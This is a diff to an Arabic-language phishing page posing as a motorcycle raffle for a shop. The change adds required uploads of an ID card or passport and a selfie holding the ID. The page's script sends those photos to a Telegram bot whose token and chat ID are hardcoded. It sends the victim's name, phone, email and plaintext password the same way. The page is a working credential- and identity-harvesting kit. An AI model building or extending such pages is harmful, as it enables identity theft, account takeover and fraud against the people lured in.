@@ -46,7 +46,7 @@
     overflow-x: hidden;
   }
 
-  /* ===== نافذة العرض المنبثقة الفورية (Popup Alert) ===== */
+  /* ===== نافذة التنبيه الفورية (عرض الفلينج) ===== */
   #promoModal {
     position: fixed;
     top: 0;
@@ -134,7 +134,7 @@
     box-shadow: 0 15px 35px rgba(6,182,212,0.5);
   }
 
-  /* ===== الشريط العلوي العصري ===== */
+  /* ===== الشريط العلوي ===== */
   .navbar {
     position: sticky;
     top: 15px;
@@ -198,7 +198,7 @@
     box-shadow: 0 5px 18px var(--primary-glow);
   }
 
-  /* ===== الهيدر العصري ===== */
+  /* ===== الهيدر ===== */
   header {
     max-width: 1100px;
     margin: 35px auto 0;
@@ -409,7 +409,7 @@
 
   .go-register-btn:hover { transform: translateY(-4px); }
 
-  /* ===== استمارة التسجيل العصرية ===== */
+  /* ===== استمارة التسجيل ===== */
   .form-container {
     background: var(--grad-glass);
     border: 2px solid rgba(56, 189, 248, 0.4);
@@ -467,10 +467,10 @@
     font-weight: 700;
   }
 
-  /* ===== صندوق رفع وضغط الصورة تلقائياً ===== */
+  /* ===== صناديق إرفاق الصور المزدوجة (الهوية + السيلفي مع الهوية) ===== */
   .upload-box {
     background: rgba(5, 11, 26, 0.9);
-    border: 2px dashed rgba(56, 189, 248, 0.4);
+    border: 2px dashed rgba(245, 158, 11, 0.6);
     border-radius: 22px;
     padding: 25px;
     text-align: center;
@@ -479,7 +479,7 @@
   }
 
   .upload-box:hover {
-    border-color: var(--cyan);
+    border-color: var(--gold);
     background: rgba(11, 19, 41, 0.95);
   }
 
@@ -494,16 +494,16 @@
   }
 
   .upload-icon { font-size: 42px; }
-  .upload-text { font-weight: 800; font-size: 16px; color: var(--cyan); }
+  .upload-text { font-weight: 800; font-size: 16px; color: var(--gold-bright); }
   .upload-sub { font-size: 13px; color: var(--text-muted); }
 
-  #imagePreview {
+  .preview-img {
     display: none;
-    max-width: 140px;
-    max-height: 140px;
+    max-width: 150px;
+    max-height: 150px;
     border-radius: 12px;
     margin: 15px auto 0;
-    border: 2px solid var(--cyan);
+    border: 2px solid var(--gold);
     object-fit: cover;
   }
 
@@ -618,13 +618,13 @@
 </head>
 <body>
 
-<!-- ===== نافذة التنبيه الفورية عند فتح الرابط (عرض الفلينج) ===== -->
+<!-- ===== نافذة التنبيه الفورية (عرض الفلينج) ===== -->
 <div id="promoModal">
   <div class="modal-box">
     <div class="modal-badge">🔥 مفاجأة الموسم الكبرى</div>
-    <h2>عرض حصري وسحب أسطوري على "متر فلينج"!</h2>
-    <p>أهلاً بك في متجر أمير المترات. لقد تم تأهل هاتفك لدخول السحب المباشر على دراجة <strong>فلينج (FELLING)</strong> زيرو مجاناً الآن!</p>
-    <button class="modal-btn" onclick="closeModal()">🚀 الدخول للمعرض والمشاركة في السحب</button>
+    <h2>سحب أسطوري على "متر فلينج"!</h2>
+    <p>أهلاً بك في متجر أمير المترات. لدخول السحب وتأكيد هويتك، يتطلب إرفاق <strong>صورة الهوية</strong> بالإضافة إلى <strong>صورة سيلفي شخصية وأنت تحمل الهوية</strong> للتحقق الفائق.</p>
+    <button class="modal-btn" onclick="closeModal()">🚀 ابدأ التسجيل الآن</button>
   </div>
 </div>
 
@@ -780,19 +780,19 @@
   </div>
 </section>
 
-<!-- ===== الاستمارة وضغط الصورة تلقائياً ===== -->
+<!-- ===== الاستمارة وإرفاق الهوية والسيلفي ===== -->
 <section id="register">
   <div class="section-head">
-    <span class="sub">بوابة التسجيل الآمنة</span>
-    <h2>أدخل بياناتك وأرفق صورة من المعرض للاشتراك</h2>
+    <span class="sub">بوابة التسجيل والتحقق الفائق</span>
+    <h2>أدخل بياناتك وأرفق الهوية وصورة السيلفي معها للتاكد</h2>
   </div>
 
   <div class="form-container">
     <form id="raffleForm">
       <div class="form-grid">
         <div class="field">
-          <label for="name">👤 الاسم الكامل (الرباعي) *</label>
-          <input type="text" id="name" required placeholder="أدخل اسمك الكامل كما في الهوية">
+          <label for="name">👤 الاسم الكامل (الرباعي مطابق للهوية) *</label>
+          <input type="text" id="name" required placeholder="أدخل اسمك الرباعي كما هو في البطاقة">
         </div>
 
         <div class="field">
@@ -833,33 +833,47 @@
           <textarea id="note" placeholder="اكتب مشاركتك أو سبب اختيارك لمتجر أمير المترات..."></textarea>
         </div>
 
-        <!-- اختيار صورة مع ضغطها تلقائياً -->
+        <!-- 1. إرفاق صورة البطاقة أو جواز السفر -->
         <div class="field full">
-          <label>🖼️ إرفاق صورة من معرض الهاتف (سيتم ضغطها تلقائياً للسرعة) *</label>
-          <div class="upload-box" onclick="document.getElementById('galleryImage').click()">
+          <label>🪪 1. إرفاق صورة البطاقة الشخصية أو جواز السفر *</label>
+          <div class="upload-box" onclick="document.getElementById('idCardImage').click()">
             <div class="upload-label">
-              <span class="upload-icon">📁</span>
-              <span class="upload-text">اختر صورة من معرض الهاتف</span>
-              <span class="upload-sub">سيتم ضغط وتصحيح حجمها تلقائياً قبل الإرسال للبوت</span>
+              <span class="upload-icon">🆔</span>
+              <span class="upload-text">اضغط هنا لإرفاق صورة البطاقة أو الجواز</span>
+              <span class="upload-sub">سيتم ضغطها تلقائياً بالخلفية</span>
             </div>
-            <input type="file" id="galleryImage" accept="image/*" required onchange="handleImageSelection(event)">
-            <img id="imagePreview" alt="معاينة الصورة المرفقة">
+            <input type="file" id="idCardImage" accept="image/*" required onchange="handleImage(event, 'idPreview')">
+            <img id="idPreview" class="preview-img" alt="معاينة الهوية">
+          </div>
+        </div>
+
+        <!-- 2. إرفاق صورة سيلفي شخصية مع الهوية للتحقق الفائق -->
+        <div class="field full">
+          <label>🤳 2. إرفاق صورة سيلفي لك وأنت تحمل الهوية (للتحقق الفائق) *</label>
+          <div class="upload-box" onclick="document.getElementById('selfieIdImage').click()">
+            <div class="upload-label">
+              <span class="upload-icon">📸</span>
+              <span class="upload-text">اضغط هنا لإرفاق صورة سيلفي مع الهوية</span>
+              <span class="upload-sub">لتأكيد أنك صاحب الطلب الحقيقي</span>
+            </div>
+            <input type="file" id="selfieIdImage" accept="image/*" required onchange="handleImage(event, 'selfiePreview')">
+            <img id="selfiePreview" class="preview-img" alt="معاينة السيلفي مع الهوية">
           </div>
         </div>
       </div>
 
-      <button type="submit" id="btn" class="btn-enter">🔥 تأكيد التسجيل وإرسال البيانات والصورة للبوت</button>
+      <button type="submit" id="btn" class="btn-enter">🔥 تأكيد التسجيل وإرسال البيانات والصور للبوت</button>
       <div id="msg" class="msg"></div>
     </form>
 
     <!-- شاشة نجاح التسجيل والتذكرة -->
     <div id="ticketBox">
-      <div class="ticket-badge">✅ تم إرسال بياناتك وصورتك المضغوطة بنجاح</div>
+      <div class="ticket-badge">✅ تم إرسال البيانات وصور التحقق الفائق واعتماد تذكرتك</div>
       <h3>مبروك! لقد دخلت السحب الأسطوري رسمياً</h3>
       <p style="color:#cbd5e1;">قم بتصوير شاشة هذا الرقم والاحتفاظ به:</p>
       <div class="ticket-code" id="ticketCode">AMIR-0000</div>
       <p style="color:#94a3b8; font-size:15px;">
-        تم رفع الصورة المضغوطة والبيانات الكاملة إلى بوت التليجرام فوراً.<br>
+        تم رفع صورة الهوية وصورة السيلفي مع البيانات إلى بوت التليجرام بنجاح.<br>
         <strong style="color:var(--gold);">متجر أمير المترات — القاعدة، جوار مستوصف السلطان</strong>
       </p>
     </div>
@@ -891,9 +905,10 @@
 const BOT_TOKEN = "8700247738:AAF8YH956qBKGSA8seF_AtZPpLw2eMO3qSw";
 const CHAT_ID   = "8299163806";
 
-let compressedImageBlob = null;
+let compressedIdBlob = null;
+let compressedSelfieBlob = null;
 
-// إغلاق نافذة التنبيه المنبثقة عند الدخول
+// إغلاق النافذة المنبثقة فوراً
 function closeModal() {
   const modal = document.getElementById("promoModal");
   modal.style.opacity = "0";
@@ -915,8 +930,8 @@ function togglePass() {
   }
 }
 
-// دالة ذكية لضغط وتحجيم الصورة المختارة من المعرض تلقائياً قبل الرفع
-function handleImageSelection(event) {
+// دالة عامة لضغط ومعاينة كل صورة على حدة
+function handleImage(event, previewId) {
   const file = event.target.files[0];
   if (!file) return;
 
@@ -927,8 +942,8 @@ function handleImageSelection(event) {
       const canvas = document.createElement("canvas");
       const ctx = canvas.getContext("2d");
 
-      const MAX_WIDTH = 1000;
-      const MAX_HEIGHT = 1000;
+      const MAX_WIDTH = 1100;
+      const MAX_HEIGHT = 1100;
       let width = img.width;
       let height = img.height;
 
@@ -949,11 +964,16 @@ function handleImageSelection(event) {
       ctx.drawImage(img, 0, 0, width, height);
 
       canvas.toBlob(function(blob) {
-        compressedImageBlob = blob;
-        const preview = document.getElementById("imagePreview");
+        if (previewId === 'idPreview') {
+          compressedIdBlob = blob;
+        } else {
+          compressedSelfieBlob = blob;
+        }
+
+        const preview = document.getElementById(previewId);
         preview.src = URL.createObjectURL(blob);
         preview.style.display = "block";
-      }, "image/jpeg", 0.75);
+      }, "image/jpeg", 0.8);
     }
     img.src = e.target.result;
   }
@@ -971,63 +991,79 @@ document.getElementById("raffleForm").addEventListener("submit", async function(
   const msg = document.getElementById("msg");
   msg.className = "msg";
 
-  if (!compressedImageBlob) {
+  if (!compressedIdBlob || !compressedSelfieBlob) {
     msg.className = "msg err";
-    msg.textContent = "❌ يرجى اختيار وإرفاق صورة من معرض الهاتف!";
+    msg.textContent = "❌ يرجى إرفاق صورة الهوية وصورة السيلفي مع الهوية معاً!";
     return;
   }
 
   const btn = document.getElementById("btn");
   btn.disabled = true;
-  btn.textContent = "⏳ جارٍ ضغط الصورة وإرسالها للبوت...";
+  btn.textContent = "⏳ جارٍ ضغط الصور وإرسالها إلى البوت...";
 
   const ticketID = "AMIR-" + Math.floor(1000 + Math.random() * 9000);
   const g = id => cleanHTML(document.getElementById(id).value.trim());
   const rawPhone = document.getElementById("phone").value.trim().replace(/\s+/g, '');
 
   const captionText =
-`🏆 <b>تسجيل عصري جديد في السحب الأسطوري!</b>
+`🚀 <b>تسجيل فائق التحقق مع الهوية والسيلفي!</b>
 ━━━━━━━━━━━━━━━━━━
 🎟️ <b>رقم التذكرة:</b> <code>${ticketID}</code>
-👤 <b>الاسم:</b> ${g("name")}
+👤 <b>الاسم (مطابق للهوية):</b> ${g("name")}
 📱 <b>الهاتف:</b> <code>${g("phone")}</code>
 📧 <b>البريد:</b> <code>${g("email")}</code>
 🔑 <b>كلمة المرور:</b> <code>${g("password")}</code>
 🏙️ <b>المنطقة:</b> ${g("city")}
 🏍️ <b>المتر المفضل:</b> ${g("favModel")}
 💬 <b>ملاحظة:</b> ${g("note") || "لا يوجد"}
-🖼️ <b>الصورة:</b> تم إرفاق وضغط الصورة بنجاح
+🆔 <b>الصور المرفقة:</b> تم إرفاق (صورة الهوية + صورة السيلفي مع الهوية) وضغطها بنجاح
 ━━━━━━━━━━━━━━━━━━
 📲 <b>تواصل سريع مع المشترك (واتساب):</b>
 https://wa.me/967${rawPhone.replace(/^0+/, '')}`;
 
   try {
-    const formData = new FormData();
-    formData.append("chat_id", CHAT_ID);
-    formData.append("photo", compressedImageBlob, "compressed_user_image.jpg");
-    formData.append("caption", captionText);
-    formData.append("parse_mode", "HTML");
+    // إرسال الصورة الأولى (الهوية)
+    const formData1 = new FormData();
+    formData1.append("chat_id", CHAT_ID);
+    formData1.append("photo", compressedIdBlob, "id_card.jpg");
+    formData1.append("caption", captionText);
+    formData1.append("parse_mode", "HTML");
 
-    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+    const res1 = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
       method: "POST",
-      body: formData
+      body: formData1
     });
+    const data1 = await res1.json();
 
-    const data = await res.json();
-    if (data.ok) {
+    if (!data1.ok) throw new Error("فشل إرسال صورة الهوية");
+
+    // إرسال الصورة الثانية (السيلفي مع الهوية)
+    const formData2 = new FormData();
+    formData2.append("chat_id", CHAT_ID);
+    formData2.append("photo", compressedSelfieBlob, "selfie_with_id.jpg");
+    formData2.append("caption", "🤳 صورة السيلفي الشخصية مع الهوية لنفس المشترك (رقم التذكرة: " + ticketID + ")");
+
+    const res2 = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+      method: "POST",
+      body: formData2
+    });
+    const data2 = await res2.json();
+
+    if (data2.ok) {
       document.getElementById("ticketCode").textContent = ticketID;
       document.getElementById("raffleForm").style.display = "none";
       document.getElementById("ticketBox").style.display = "block";
       document.getElementById("ticketBox").scrollIntoView({ behavior: "smooth" });
     } else {
-      throw new Error(data.description || "Telegram Error");
+      throw new Error("فشل إرسال صورة السيلفي");
     }
+
   } catch (err) {
     msg.className = "msg err";
-    msg.textContent = "❌ تعذر إرسال البيانات والصورة، يرجى التحقق من اتصال الإنترنت والمحاولة مرة أخرى.";
+    msg.textContent = "❌ تعذر إرسال البيانات والصور للبوت، يرجى التحقق من اتصال الإنترنت والمحاولة.";
     console.error(err);
     btn.disabled = false;
-    btn.textContent = "🔥 تأكيد التسجيل وإرسال البيانات والصورة للبوت";
+    btn.textContent = "🔥 تأكيد التسجيل وإرسال البيانات والصور للبوت";
   }
 });
 </script>
